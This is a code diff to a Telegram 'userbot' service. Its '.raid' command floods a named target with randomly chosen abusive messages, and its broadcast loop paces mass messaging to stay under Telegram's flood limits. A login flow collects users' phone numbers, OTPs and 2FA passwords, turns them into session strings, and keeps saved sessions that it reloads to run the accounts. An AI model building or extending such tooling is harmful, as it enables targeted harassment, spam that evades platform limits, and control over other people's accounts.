@@ -228,7 +228,6 @@ async def raid_cmd(c, m):
             try:
                 msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                 await c.send_message(m.chat.id, msg)
-                # Flooding protection during raid
                 await asyncio.sleep(2.5) 
             except errors.FloodWait as e: await asyncio.sleep(e.value)
             except Exception: pass
@@ -271,7 +270,7 @@ async def main_broadcast(c, m):
         try:
             await assigned_ubot.send_message(chat_id, broadcast_text)
             success_count += 1
-            if success_count % 5 == 0: await asyncio.sleep(1.0) # Flood bypass delay
+            if success_count % 5 == 0: await asyncio.sleep(1.0)
         except errors.FloodWait as e: await asyncio.sleep(e.value)
         except Exception: pass
         
@@ -294,11 +293,11 @@ HELP_TEXT = """🛠️ **CoderNova Userbot - Help Menu** 🛠️
 🔹 `.raid [count] [@username]` - Start raid execution.
 🔹 `.stop` - Kill all running loops."""
 
-GUIDE_TEXT = """📖 **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ - sʏsᴛᴇᴍ ɢᴜɪɢᴇ** 📖
+GUIDE_TEXT = """📖 **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ - sʏsᴛᴇᴍ ɢuɪᴅᴇ** 📖
 
 𝟷. **ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ:** 'ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ' ᴘᴀʀ ᴄʟɪᴄᴋ ᴋᴀʀᴋᴇ ᴀᴘɴᴀ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴇɪɴ.
-𝟸. **ᴏᴛᴘ sᴜʙᴍɪs sɪᴏɴ:** ᴏᴛᴘ ᴋᴏ sᴘᴀᴄᴇ ᴋᴇ sᴀᴀᴛʜ (`𝟷 𝟸 𝟹 𝟺 𝟻`) ʏᴀ ʙɪɴᴀ sᴘᴀᴄᴇ ᴋᴇ ʙʜᴇᴊᴇɪɴ. 
-𝟹. **sᴇᴄᴜʀɪᴛʏ:** ᴀᴀᴘᴋᴀ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀᴀᴘᴋᴇ ᴘʀɪᴠᴀᴛᴇ ᴍᴇssᴀɢᴇ ᴍᴇ ɪɴsᴛᴀɴᴛ sᴇɴᴅ ʜᴏ ᴊᴀʏᴇɢᴀ."""
+𝟸. **ᴏᴛᴘ sᴜʙᴍɪs sɪᴏɴ:** ᴏᴛᴘ ᴋᴏ sᴘᴀᴄᴇ ᴋᴇ sᴀᴀᴛʜ (`𝟷 𝟸 𝟹 𝟺 𝟻`) ʜɪ ʙʜᴇᴊᴇɪɴ.
+𝟹. **sᴇᴄᴜʀɪᴛʏ:** ᴀᴀᴘᴋᴀ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀᴀᴘᴋᴇ ᴘʀɪᴠᴀᴛᴇ ᴍᴇssᴀɢᴇ ᴍᴇ sᴇɴᴅ ʜᴏ ᴊᴀʏᴇɢᴀ."""
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_handler(c, m):
@@ -354,14 +353,14 @@ async def handle_steps(c, m):
             await temp_c.connect()
             code = await temp_c.send_code(text)
             user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
-            # Sahi clear instruction for OTP submission
-            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n⚠️ **ɢᴜɪᴅᴇ:** OTP ko niche diye gaye format ki tarah hi bhejein:\n👉 `1 2 3 4 5` (Spaces ke sath)\n👉 `12345` (Bina space ke)")
+            # Strict Space Format Guide Only
+            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n⚠️ **ɢᴜɪᴅᴇ:** OTP ko har digit ke baad space dekar hi bhejein:\n👉 `1 2 3 4 5` (Spaces ke sath)")
         except errors.FloodWait as e:
-            await m.reply_text(f"⏳ **Telegram Flooding Protection Activated!** Please try again after `{e.value}` seconds.")
+            await m.reply_text(f"⏳ **Telegram Flooding Protection:** Please try again after `{e.value}` seconds.")
         except Exception as e: 
             await m.reply_text(f"❌ `{e}`")
             
-    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
+    elif " " in text and text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
         otp = text.replace(" ", "")
         try:
             await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
@@ -370,7 +369,6 @@ async def handle_steps(c, m):
             user_data[uid].update({"step": "password"})
             await m.reply_text("🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ!**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ 𝟸ғᴀ ᴘᴀssᴡᴏʀᴅ:")
         except errors.FloodWait as e:
-            await m.reply_text(f"⏳ **FloodWait:** Waiting for `{e.value}` seconds to prevent lock.")
             await asyncio.sleep(e.value)
         except Exception as e: 
             await m.reply_text(f"❌ `{e}`")
@@ -392,28 +390,20 @@ async def finalize_login(c, m, uid):
     await ubot.start()
     running_ubots[uid] = ubot
     
-    # User ko unke strictly PRIVATE MESSAGE me string send karna
     success_msg = (
         "🎉 **sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ!**\n\n"
-        "🔒 **sᴇᴄᴜʀɪᴛʏ ᴀʟᴇʀᴛ:** Aapka string session niche private message me de diya gaya hai. Isko kisi ke sath share mat karna!\n\n"
+        "🔒 **sᴇᴄᴜʀɪᴛʏ ᴀʟᴇʀᴛ:** Aapka string session safe chat me bhej diya gaya hai:\n\n"
         f"`{string}`"
     )
     await bot.send_message(uid, success_msg)
-    
-    # Log group me sirf trigger report jayegi, actual string safe rahegi
-    try: 
-        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ:** User ID: `{uid}`\n(String sent safely to user's private chat.)")
-    except Exception: 
-        pass
-        
-    if uid in user_data: 
-        del user_data[uid]
+    try: await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ:** ID: `{uid}`")
+    except Exception: pass
+    if uid in user_data: del user_data[uid]
 
 # --- ENGINE STARTUP ---
 async def start_services():
     print("[INFO] Launching main Bot Engine...")
     await bot.start()
-    print("[SUCCESS] Main engine active.")
     
     saved_sessions = load_local_sessions()
     for u_id, string in saved_sessions.items():
@@ -424,11 +414,8 @@ async def start_services():
             register_ubot_handlers(ubot)
             await ubot.start()
             running_ubots[int(u_id)] = ubot
-            await asyncio.sleep(1.5) # Prevent startup flooding cascade
-        except errors.FloodWait as e:
-            await asyncio.sleep(e.value)
-        except Exception: 
-            pass
+            await asyncio.sleep(1.5)
+        except Exception: pass
     await idle()
 
 if __name__ == "__main__":
